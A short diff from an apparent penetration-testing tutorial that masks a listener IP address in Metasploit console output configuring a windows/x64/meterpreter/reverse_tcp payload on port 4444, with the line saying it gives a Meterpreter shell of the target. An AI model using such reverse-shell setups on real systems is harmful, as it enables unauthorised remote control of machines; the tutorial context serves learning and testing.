@@ -176,7 +176,7 @@ This is where the real work begins, significantly reducing the time-consuming pr
           PAYLOAD => windows/x64/meterpreter/reverse_tcp
           LHOST => ***.***.**.**
           LPORT => 4444
-          [*] Started reverse TCP handler on 10.9.7.83:4444 
+          [*] Started reverse TCP handler on ***.***.**.**:4444 
 
 
 And give us the Meterpreter Shell of the target.
